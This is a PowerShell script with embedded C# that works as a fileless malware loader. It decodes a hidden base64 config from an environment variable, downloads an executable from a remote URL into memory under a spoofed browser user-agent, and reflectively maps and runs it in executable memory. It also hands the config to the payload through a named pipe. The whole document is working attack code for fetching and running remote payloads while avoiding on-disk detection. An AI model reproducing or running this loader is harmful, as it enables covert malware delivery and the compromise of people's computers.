# Decode config from env var set by cmd line
try{
    $c=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($env:C))
}catch{exit}

try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12}catch{}

# Parse EXE URL from config
$cfg=$c|ConvertFrom-Json
$exeUrl=$cfg.ExeUrl

# Download EXE bytes directly into memory
$bytes=$null
try{
    $wc=New-Object Net.WebClient
    $wc.Headers.Add('User-Agent','Mozilla/5.0')
    $bytes=$wc.DownloadData($exeUrl)
}catch{exit}
if(-not $bytes -or $bytes.Length-eq 0){exit}

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Mem {
    [DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a,ulong s,uint t,uint p);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a,ulong s,uint n,out uint o);
    [DllImport("kernel32")] public static extern IntPtr LoadLibraryA(string n);
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr m,string n);
    [DllImport("kernel32")] public static extern IntPtr CreateThread(IntPtr sa,ulong ss,IntPtr ea,IntPtr p,uint f,out uint tid);
    [DllImport("kernel32")] public static extern uint WaitForSingleObject(IntPtr h,uint ms);
    public static void Run(byte[] pe) {
        int lfanew=BitConverter.ToInt32(pe,0x3C);
        int opt=lfanew+24;
        uint szImg=BitConverter.ToUInt32(pe,opt+56);
        uint szHdr=BitConverter.ToUInt32(pe,opt+60);
        long imgBase=BitConverter.ToInt64(pe,opt+24);
        int numSec=BitConverter.ToUInt16(pe,lfanew+6);
        ushort szOpt=BitConverter.ToUInt16(pe,lfanew+20);
        int secTab=lfanew+4+20+szOpt;
        uint epRVA=BitConverter.ToUInt32(pe,opt+16);
        uint impRVA=BitConverter.ToUInt32(pe,opt+104+8);
        uint relRVA=BitConverter.ToUInt32(pe,opt+104+40);
        uint relSz=BitConverter.ToUInt32(pe,opt+104+44);

        IntPtr mem=VirtualAlloc(new IntPtr(imgBase),szImg,0x3000,0x40);
        if(mem==IntPtr.Zero)mem=VirtualAlloc(IntPtr.Zero,szImg,0x3000,0x40);
        if(mem==IntPtr.Zero)return;

        Marshal.Copy(pe,0,mem,(int)szHdr);
        for(int i=0;i<numSec;i++){
            int s=secTab+i*40;
            uint va=BitConverter.ToUInt32(pe,s+12),rs=BitConverter.ToUInt32(pe,s+16),ro=BitConverter.ToUInt32(pe,s+20);
            if(rs>0)Marshal.Copy(pe,(int)ro,IntPtr.Add(mem,(int)va),(int)rs);
        }

        long delta=mem.ToInt64()-imgBase;
        if(relRVA!=0&&delta!=0){
            int p=(int)relRVA,end=(int)(relRVA+relSz);
            while(p<end){
                uint pgRVA=BitConverter.ToUInt32(pe,p);
                uint blk=BitConverter.ToUInt32(pe,p+4);
                if(blk==0)break;
                for(int i=0;i<(int)(blk-8)/2;i++){
                    ushort e=BitConverter.ToUInt16(pe,p+8+i*2);
                    int t=e>>12,off=e&0xFFF;
                    if(t==10){IntPtr fa=IntPtr.Add(mem,(int)(pgRVA+off));Marshal.WriteInt64(fa,Marshal.ReadInt64(fa)+delta);}
                    else if(t==3){IntPtr fa=IntPtr.Add(mem,(int)(pgRVA+off));Marshal.WriteInt32(fa,(int)(Marshal.ReadInt32(fa)+delta));}
                }
                p+=(int)blk;
            }
        }

        if(impRVA!=0){
            int ip=(int)impRVA;
            while(true){
                uint oft=BitConverter.ToUInt32(pe,ip),nr=BitConverter.ToUInt32(pe,ip+12),ft=BitConverter.ToUInt32(pe,ip+16);
                if(nr==0)break;
                IntPtr hDll=LoadLibraryA(Marshal.PtrToStringAnsi(IntPtr.Add(mem,(int)nr)));
                int th=(int)ft,oth=(int)(oft!=0?oft:ft);
                while(true){
                    long tv=Marshal.ReadInt64(IntPtr.Add(mem,oth));
                    if(tv==0)break;
                    IntPtr fn;
                    if((tv&unchecked((long)0x8000000000000000L))!=0)fn=GetProcAddress(hDll,new IntPtr(tv&0xFFFF));
                    else fn=GetProcAddress(hDll,Marshal.PtrToStringAnsi(IntPtr.Add(mem,(int)tv+2)));
                    Marshal.WriteInt64(IntPtr.Add(mem,th),fn.ToInt64());
                    th+=8;oth+=8;
                }
                ip+=20;
            }
        }

        uint tid;
        IntPtr ht=CreateThread(IntPtr.Zero,0,IntPtr.Add(mem,(int)epRVA),IntPtr.Zero,0,out tid);
        WaitForSingleObject(ht,0xFFFFFFFF);
    }
}
"@ -Language CSharp

# Pipe config to payload, then reflectively load EXE
$pipeJob=Start-Job -Arg $c -ScriptBlock{
    param($j)
    try{
        $p=New-Object IO.Pipes.NamedPipeServerStream('blitzed_cfg_pipe','Out',1,'Byte','None')
        $p.WaitForConnection()
        $b=[Text.Encoding]::UTF8.GetBytes($j)
        $p.Write($b,0,$b.Length)
        $p.Flush()
        $p.Dispose()
    }catch{}
}
[Mem]::Run($bytes)
Remove-Job $pipeJob -Force 2>$null
